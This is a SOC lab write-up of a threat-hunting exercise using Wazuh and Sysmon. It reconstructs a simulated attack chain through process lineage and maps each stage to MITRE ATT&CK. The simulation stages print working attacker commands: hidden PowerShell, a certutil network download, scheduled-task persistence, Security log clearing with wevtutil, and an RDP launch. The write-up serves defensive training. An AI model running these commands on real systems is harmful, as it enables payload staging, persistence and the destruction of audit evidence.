\# Detection Engineering \& SOC Investigation — Proactive Hunting Workflow



\## Objective



Transition from reactive alert investigation into proactive threat hunting using behavior-based analysis, process lineage reconstruction, and artifact lifecycle tracking within a SOC environment.



This exercise focuses on answering:



\- How analysts pivot from alerts into investigation questions

\- How to validate attacker persistence behavior

\- How to confirm execution vs staging phases

\- How to hunt beyond triggered alerts



---



\## Lab Environment



\- Wazuh SIEM (Manager / Indexer / Dashboard)

\- Ubuntu Server (SOC backend)

\- Windows 11 Endpoint (WIN-ENDPOINT-01)

\- Sysmon telemetry (Event ID 1 — Process Create)



---



\## Attack Simulation (Controlled \& Safe)



\### Stage 1 — Suspicious Execution



powershell -nop -w hidden -c calc.exe





Behavior indicator:



\- Hidden PowerShell execution

\- Potential attacker controller process



---



\### Stage 2 — Payload Staging



certutil -urlcache -split -f https://example.com

&nbsp;C:\\Users\\Public\\payload.txt





Observed:



\- LOLBin download behavior

\- Artifact creation (payload.txt)



---



\### Stage 3 — Persistence Creation



schtasks /Create /SC ONLOGON /TN UpdateCheck /TR notepad.exe /F





Observed:



\- Scheduled task persistence

\- Parent process: PowerShell



---



\### Stage 4 — Defense Evasion



wevtutil cl Security





Observed:



\- Security event log clearing attempt



---



\### Stage 5 — Lateral Movement Simulation



mstsc /v:10.10.10.10





Observed:



\- RDP client execution



---



\## Investigation Workflow



\### Step 1 — Timeline Reconstruction



Using jq queries on alerts.json:



\- Isolated behavior chain

\- Identified PowerShell as controller process



Process tree:



PowerShell

├── calc.exe

├── certutil.exe

├── schtasks.exe

├── wevtutil.exe

└── mstsc.exe







---



\### Step 2 — Artifact Lifecycle Analysis



Investigated payload.txt activity:



\- Initial creation via certutil

\- Later interaction via Notepad

\- Parent process context analyzed



Key insight:



Artifact opened ≠ payload execution.



---



\### Step 3 — Persistence Validation



Hypothesis:



Scheduled task will execute on next user logon.



Action:



\- System reboot / logon performed.



Result:



\- New Notepad process observed via Sysmon Event ID 1.

\- Confirms persistence trigger.



---



\## Key SOC Analyst Skills Practiced



\- Behavior-based investigation

\- Process lineage analysis

\- Artifact-centric hunting

\- Hypothesis-driven investigation workflow

\- Validation of persistence mechanisms



---



\## MITRE ATT\&CK Mapping



\- T1059.001 — PowerShell Execution

\- T1105 — Ingress Tool Transfer

\- T1053.005 — Scheduled Task Persistence

\- T1070 — Indicator Removal (Log Clearing)

\- T1021 — Remote Services (RDP)



---



\## Analyst Insight



Real-world investigations require:



\- Moving beyond alerts into behavior chains

\- Identifying controller processes

\- Predicting attacker next steps

\- Validating persistence activation



This exercise demonstrates the transition from reactive SOC analysis into proactive threat hunting.



